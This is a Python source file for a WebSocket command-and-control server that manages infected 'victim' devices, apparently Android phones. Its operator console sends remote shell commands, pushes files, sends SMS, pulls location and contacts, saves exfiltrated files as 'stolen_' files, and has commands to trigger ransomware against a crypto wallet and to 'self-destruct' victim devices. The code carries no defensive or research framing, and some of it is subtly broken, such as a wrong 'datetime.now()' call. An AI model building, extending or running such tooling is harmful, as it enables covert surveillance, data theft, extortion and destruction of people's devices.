#!/usr/bin/env python3
# 🔴 EKSTREM C2 SERVER

import asyncio
import websockets
import json
import datetime
from colorama import init, Fore, Style

init(autoreset=True)

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.victim_data = {}
        
    async def handler(self, websocket, path):
        client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
        self.clients[client_id] = websocket
        print(f"{Fore.GREEN}[+] New victim connected: {client_id}")
        
        try:
            async for message in websocket:
                await self.process_message(client_id, message)
        except websockets.exceptions.ConnectionClosed:
            print(f"{Fore.RED}[-] Victim disconnected: {client_id}")
            del self.clients[client_id]
    
    async def process_message(self, client_id, message):
        try:
            data = json.loads(message)
            
            if data.get('type') == 'heartbeat':
                print(f"{Fore.CYAN}[♥] Heartbeat from {client_id}: {data.get('battery')}%")
                self.victim_data[client_id] = data
                
            elif data.get('type') == 'result':
                print(f"{Fore.YELLOW}[📟] Command result from {client_id}:\n{data.get('data')}")
                
            elif data.get('type') == 'file':
                filename = data.get('name')
                content = data.get('content')
                with open(f"stolen_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{filename}", 'w') as f:
                    f.write(content)
                print(f"{Fore.GREEN}[📁] File received: {filename}")
                
            elif data.get('type') == 'location':
                loc = data.get('data')
                print(f"{Fore.MAGENTA}[📍] Location from {client_id}: {loc}")
                
            elif data.get('type') == 'contacts':
                print(f"{Fore.BLUE}[👥] Contacts received from {client_id}")
                
            else:
                print(f"{Fore.WHITE}[📨] Unknown data: {message[:100]}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def send_command(self, client_id, command):
        if client_id in self.clients:
            await self.clients[client_id].send(json.dumps(command))
            print(f"{Fore.YELLOW}[➡️] Command sent to {client_id}: {command.get('action')}")
    
    async def broadcast(self, command):
        for client_id in self.clients:
            await self.send_command(client_id, command)
    
    async def console(self):
        while True:
            try:
                cmd = input(f"{Fore.RED}C2> {Style.RESET_ALL}").strip()
                
                if cmd == 'help':
                    print("""
Commands:
  list                    - List all victims
  use <id>                - Select victim
  exec <command>          - Execute shell command
  upload <file>           - Upload file to victim
  download <file>         - Download file from victim
  sms <phone> <msg>       - Send SMS
  location                - Get victim location
  contacts                - Get victim contacts
  ransomware <wallet>     - Activate ransomware
  self-destruct           - Destroy victim device
  broadcast <cmd>         - Send to all victims
  exit                    - Exit
                    """)
                    
                elif cmd == 'list':
                    for i, client in enumerate(self.clients):
                        print(f"{i+1}. {client}")
                        
                elif cmd.startswith('use '):
                    client_id = cmd[4:].strip()
                    if client_id in self.clients:
                        while True:
                            subcmd = input(f"{Fore.RED}({client_id})> {Style.RESET_ALL}")
                            if subcmd == 'back':
                                break
                            elif subcmd.startswith('exec '):
                                await self.send_command(client_id, {
                                    'action': 'EXEC',
                                    'command': subcmd[5:]
                                })
                            elif subcmd.startswith('upload '):
                                file_path = subcmd[7:]
                                with open(file_path, 'r') as f:
                                    content = f.read()
                                await self.send_command(client_id, {
                                    'action': 'DOWNLOAD',
                                    'url': f"http://{self.host}:8000/{file_path}",
                                    'path': '/sdcard/Download/'
                                })
                            elif subcmd == 'location':
                                await self.send_command(client_id, {'action': 'LOCATION'})
                            elif subcmd == 'contacts':
                                await self.send_command(client_id, {'action': 'CONTACTS'})
                            elif subcmd.startswith('sms '):
                                parts = subcmd[4:].split(' ', 1)
                                await self.send_command(client_id, {
                                    'action': 'SMS',
                                    'phone': parts[0],
                                    'message': parts[1]
                                })
                            elif subcmd.startswith('ransomware '):
                                await self.send_command(client_id, {
                                    'action': 'RANSOMWARE',
                                    'wallet': subcmd[11:]
                                })
                            elif subcmd == 'self-destruct':
                                confirm = input("Are you sure? (yes/no): ")
                                if confirm == 'yes':
                                    await self.send_command(client_id, {'action': 'SELF_DESTRUCT'})
                            else:
                                print("Unknown command")
                                
                elif cmd.startswith('broadcast '):
                    await self.broadcast({'action': 'EXEC', 'command': cmd[10:]})
                    
                elif cmd == 'exit':
                    break
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
    
    async def start(self):
        print(f"{Fore.GREEN}[*] C2 Server starting on {self.host}:{self.port}")
        print(f"{Fore.GREEN}[*] WebSocket server ready")
        
        async with websockets.serve(self.handler, self.host, self.port):
            await self.console()

if __name__ == "__main__":
    server = C2Server()
    asyncio.run(server.start())